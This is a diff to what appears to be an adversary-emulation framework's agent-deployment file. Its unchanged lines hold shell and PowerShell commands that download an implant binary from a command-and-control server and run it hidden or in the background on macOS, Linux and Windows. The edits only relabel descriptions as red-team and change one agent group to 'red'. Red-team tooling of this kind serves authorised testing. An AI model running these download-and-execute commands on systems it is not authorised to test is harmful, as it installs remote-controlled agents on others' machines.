@@ -26,7 +26,7 @@
               server="#{app.contact.http}";
               agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -server $server &
-          - description: Compile agent with a comma-separated list of extension modules (requires GoLang to be installed on the C2 server machine).
+          - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
             command: |
               server="#{app.contact.http}";
               curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
@@ -62,7 +62,7 @@
               server="#{app.contact.http}";
               agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -server $server &
-          - description: Compile agent with a comma-separated list of extension modules (requires GoLang to be installed on the C2 server machine).
+          - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
             command: |
               server="#{app.contact.http}";
               curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
@@ -108,7 +108,7 @@
               rm -force "C:\Users\Public\$name.exe" -ea ignore;
               [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
               Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
-          - description: Compile agent with a comma-separated list of extension modules (requires GoLang to be installed on the C2 server machine).
+          - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
             command: |
               $server="#{app.contact.http}";
               $url="$server/file/download";
@@ -121,7 +121,7 @@
               get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
               rm -force "C:\Users\Public\$name.exe" -ea ignore;
               [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
-              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
+              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
           - description: Deploy as a P2P agent with known peers included in compiled agent
             command: |
               $server="#{app.contact.http}";
